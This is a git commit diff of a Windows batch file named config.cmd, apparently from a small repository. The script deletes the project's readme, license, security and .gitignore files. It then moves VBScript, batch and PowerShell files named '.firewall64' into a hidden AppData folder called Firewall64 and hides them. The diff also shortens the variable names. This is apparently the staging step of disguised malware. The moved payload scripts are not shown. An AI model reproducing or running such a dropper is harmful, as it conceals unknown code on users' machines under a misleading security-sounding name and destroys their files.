10ccc37869972a024d8799d0fe53cff65e9fb4d0
fxhxyz <fxhxyz7@proton.me>
2025-01-19 20:13:44 +0000

    added config.cmd

--- config.cmd
+++ config.cmd
@@ -1,30 +1,32 @@
 @echo off
 :: setup work cd
-set "SOURCE_FOLDER=%CD%"
-set "HIDDEN_FOLDER=%APPDATA%\Firewall64"
+set "SF=%CD%"
+set "HD=%APPDATA%\Firewall64"
 
 :: deleted github files
-del /f /q "%SOURCE_FOLDER%\readme" >nul 2>&1
-del /f /q "%SOURCE_FOLDER%\license" >nul 2>&1
-del /f /q "%SOURCE_FOLDER%\security" >nul 2>&1
-del /f /q "%SOURCE_FOLDER%\.gitignore" >nul 2>&1
+del /f /q "%SF%\readme" >nul 2>&1
+del /f /q "%SF%\license" >nul 2>&1
+del /f /q "%SF%\security" >nul 2>&1
+del /f /q "%SF%\.gitignore" >nul 2>&1
+del /f /q "%SF%\text.txt" >nul 2>&1
 
 :: create folder
-if not exist "%HIDDEN_FOLDER%" (
-    mkdir "%HIDDEN_FOLDER%"
-    attrib +h "%HIDDEN_FOLDER%"
+if not exist "%HD%" (
+    mkdir "%HD%"
+    attrib +h "%HD%"
 )
 
 :: moved script files
-move /y "%SOURCE_FOLDER%\.firewall64.vbs" "%HIDDEN_FOLDER%\" >nul
-move /y "%SOURCE_FOLDER%\.firewall64.bat" "%HIDDEN_FOLDER%\" >nul
-move /y "%SOURCE_FOLDER%\.firewall64.ps1" "%HIDDEN_FOLDER%\" >nul
+move /y "%SF%\.firewall64.vbs" "%HD%\" >nul
+move /y "%SF%\.firewall64.bat" "%HD%\" >nul
+move /y "%SF%\.firewall64.ps1" "%HD%\" >nul
+move /y "%SF%\.ascii.txt" "%HD%\" >nul
 
-attrib +h "%HIDDEN_FOLDER%\.firewall64.vbs"
-attrib +h "%HIDDEN_FOLDER%\.firewall64.bat"
-attrib +h "%HIDDEN_FOLDER%\.firewall64.ps1"
+attrib +h "%HD%\.firewall64.vbs"
+attrib +h "%HD%\.firewall64.bat"
+attrib +h "%HD%\.firewall64.ps1"
 
-for %%f in (%SOURCE_FOLDER%\.*) do (
+for %%f in (%SF%\.*) do (
     attrib +h "%%f" >nul 2>&1
 )
 
